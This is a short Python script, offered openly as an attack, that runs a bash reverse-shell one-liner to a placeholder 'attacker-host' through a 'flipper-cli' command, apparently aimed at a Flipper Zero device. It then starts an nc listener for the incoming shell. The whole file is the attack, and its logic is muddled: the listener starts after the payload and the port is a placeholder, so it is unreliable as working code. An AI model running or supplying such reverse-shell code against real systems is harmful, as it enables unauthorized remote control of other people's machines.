import os
import subprocess

# Reverse shell command
cmd = "bash -i >& /dev/tcp/attacker-host/attacker-port 0>&1"

# Run the command on the Flipper Zero device
os.system('flipper-cli shell -c "{}"'.format(cmd))

# Start a listener on the attacker machine to receive the reverse shell
subprocess.Popen(["nc", "-lvp", "attacker-port"])
